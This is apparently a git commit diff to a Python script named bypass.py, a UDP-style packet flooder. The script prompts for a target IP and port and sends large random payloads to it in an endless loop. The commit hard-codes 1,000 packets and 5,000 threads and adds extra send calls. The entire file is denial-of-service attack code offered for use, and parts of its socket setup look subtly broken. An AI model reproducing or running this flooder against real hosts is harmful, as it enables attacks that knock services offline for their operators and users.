6775ffcf60b20f33a23eb27e95876d785a9d503a
RetZ <96674366+ImRetZ@users.noreply.github.com>
2022-10-03 17:44:24 +0700

    Update bypass.py

--- bypass.py
+++ bypass.py
@@ -10,23 +10,20 @@ Code By RetZ.
 
 ip = str(input("\033[93mIp Target: "))
 port = int(input("\033[93mPort Target: "))
-times = int(input("\033[93mPackets: "))
-threads = int(input("\033[93mThreads: "))
+times = int("1000")
+threads = int("5000")
 def udp():
   data = random._urandom(65500)
   pack = 0
   while True:
     try:
-     # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-     # s.setsockopt(socket.SOL_SOCKET, socket.REUSE_ADDR)
-
       sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-     # sock.setsockopt(socket.SOL_SOCKET, socket.REUSE_ADDR)
 
       addr = (str(ip),int(port))
+      sock.connect((ip,port))
       for x in range(times):
-       # s.sendto(data,addr)
-        sock.sendto(data,addr)
+       sock.sendto(data,addr)
+       sock.send(data)
       pack += 1
       print(f"\033[91mSend Packets To %s:%s ==> %s"%(ip,port,pack))
     except:
